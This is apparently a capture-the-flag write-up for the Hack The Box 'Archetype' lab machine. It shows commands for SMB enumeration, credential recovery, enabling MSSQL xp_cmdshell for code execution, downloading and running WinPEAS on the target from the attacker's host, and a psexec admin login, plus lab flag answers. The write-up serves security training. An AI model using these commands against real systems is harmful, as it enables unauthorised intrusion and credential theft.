---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Archetype (Tier 2)

## <mark style="color:blue;">Description</mark>

* **Tier&#x20;**<mark style="color:green;">**->**</mark> 2
* **Difficult** <mark style="color:green;">**->**</mark> Very Easy
* **OS** <mark style="color:green;">**->**</mark> Windows
* **Tags&#x20;**<mark style="color:green;">**->**</mark> Protocols / MSSQL / SMB / Powershell / Reconnaissance / Remote Code Execution\
  &#x20;             / Clear Text Credentials / Information Disclosure / Anonymous-Guest Access

<figure><img src="../../.gitbook/assets/image (523).png" alt=""><figcaption><p><a href="https://app.hackthebox.com/starting-point?tier=1">https://app.hackthebox.com/starting-point?tier=2</a></p></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial port scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

{% code lineNumbers="true" %}
```bash
nmap 10.129.59.187 -p- -Pn --min-rate 2500 -oN scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>

***

* With this, I answered the first question

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

> Answer: _**1433**_

***

* Then I did an exhaustive scan on the ports found to get information about the services running

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nmap 10.129.59.187 -p135,139,445,1433,5985,47001,49664,49666,49667,49668,49669 -sVC -oN serv_scan.txt
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (515).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (516).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* I found two interesting services, an SMB server on port 445 and an [_MS SQL_](https://www.microsoft.com/en/sql-server/) database on port 1433. I started interacting with the SMB service using the [_smbclient_](../../networks/tools-and-utilities.md#smbclient) utility and trying to list the shared folders. When asked for the password, I just entered a blank password and it worked successfully listing the shared contents&#x20;

{% code lineNumbers="true" %}
```bash
smbclient -L 10.129.59.187
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (517).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the SMB protocol you can go [here](../../networks/protocols/smb.md)
{% endhint %}

***

* With this, I answered the next question

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

> Answer: _**backups**_

***

* Then I tried to access these folders and check their content starting with the striking _backups_ folder which didn't have privilege restrictions to access it. Once inside, I listed the contents of the folder and found a file that seemed to be a backup of important information, so, I downloaded it to my machine and closed the connection

{% code overflow="wrap" lineNumbers="true" %}
```bash
smbclient //10.129.59.187/backups
get prod.dstConfig
exit
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (518).png" alt=""><figcaption></figcaption></figure>

***

* I  checked the file content and found important information about the configuration of a product and within it, credentials for a database. These could maybe be for the _MS SQL_ database I running on the machine

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

***

* With this and some research, I answered the next questions

<figure><img src="../../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>

> Answer: _**M3g4c0rp123**_

***

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

> Answer: _**mssqlclient.py**_

***

<figure><img src="../../.gitbook/assets/image (90).png" alt=""><figcaption></figcaption></figure>

> Answer: _**xp\_cmdshell**_

***

<figure><img src="../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

> Answer: _**WinPEAS**_

***

* To help me to connect to the database I used the [_Impacket_](../../networks/tools-and-utilities.md#impacket) tool kit, using the _mssqlclient_ module to connect to the _MS SQL_ service with the credentials I had found in the previous file. Also, as I knew this was a Windows host, I specified to use this kind of authentication, and after starting the connection, I successfully connected

{% code overflow="wrap" lineNumbers="true" %}
```bash
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.59.187 -windows-auth
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (519).png" alt=""><figcaption></figcaption></figure>

***

* Once inside, I explored the database but didn't find anything relevant, so next, I checked if it was possible to abuse the _xp\_cmdshell_ utility which could let me gain [_RCE_](../../penetration-testing/related-concepts.md) through _MS SQL_. I tried to execute a command but it told me that the utility was not configured, so I did the proper configuration and after retrying it worked

<pre class="language-powershell" data-overflow="wrap" data-line-numbers><code class="lang-powershell"><strong>EXEC xp_cmdshell 'whoami';
</strong>EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
</code></pre>

<figure><img src="../../.gitbook/assets/image (503).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
This reconfiguration will only work if we have high privileges to do it
{% endhint %}

{% hint style="success" %}
To learn the complete process for abusing _xp\_cmdshell_ you can go [here](../../database-attacks/specific-scenarios/ms-sql-xp_cmdshell-abuse.md)
{% endhint %}

***

* With this, as I could execute system commands I tried to invoke a PowerShell to interact more comfortably with the system. I did a little test using the `pwd` command to and got a positive response giving us the corresponding output

{% code overflow="wrap" lineNumbers="true" %}
```bash
EXEC xp_cmdshell "powershell -c pwd";
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (555).png" alt=""><figcaption></figcaption></figure>

***

* So abusing this, I could do an internal file enumeration in the system. I went to the user's Desktop folder and listed its contents, where I found a _user.txt_ file which I read to obtain the user flag

{% code overflow="wrap" lineNumbers="true" %}
```powershell
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Desktop ; dir";
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Desktop ; Get-Content user.txt";
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (506).png" alt=""><figcaption></figcaption></figure>

***

* I had to find a way to escalate privileges so to help me with this I tried using [_WinPEAS_](../../penetration-testing/process-stages/post-exploitation/tools-and-utilities.md#winpeas) to find any path to do the escalation. I imported it successfully, ran it, and after the scan was finished, checked the results which let us know the path to some interesting files that were found

{% code overflow="wrap" lineNumbers="true" %}
```bash
# In our machine
wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe   #Get WinPEAS
python3 -m http.server 1234 #On the folder where we have WinPEAS to host it

# In the target machine
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Desktop ; wget http://10.10.14.117:1234/winPEASx64.exe -outfile winPEASx64.exe"
EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Desktop ; .\winPEASx64.exe"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (510).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* I observed one of the routes was under the PowerShell installation folder and seemed to be a file related to the history of commands. If I navigated to that route and checked the content of the file, where I found a command for a previous connection to the _Administrator_ user, and also that the corresponding password for this user was being leaked

<figure><img src="../../.gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>

***

* With this and the previously found user flag, I answered the next questions

<figure><img src="../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

> Answer: _**ConsoleHost\_history.txt**_

***

<figure><img src="../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

> Answer: _**3e7b102e78218e935bf3f4951fec21a3**_

***

* Knowing this information, I could try to access the network service on the target with these credentials. For this, _Impacket_ helped me again, this time with the _psexec_ module, and after using it I successfully logged in as a privileged user

{% code overflow="wrap" lineNumbers="true" %}
```bash
impacket-psexec administrator@10.129.59.187
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (521).png" alt=""><figcaption></figcaption></figure>

***

* Finally, I navigated to the Desktop folder of the _Administrator_ user where I found a _root.txt_ file, and reading its content I retrieved the root flag

<figure><img src="../../.gitbook/assets/image (522).png" alt=""><figcaption></figcaption></figure>

***

* With this, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**b91ccec3305e98240082d4474b848528**_
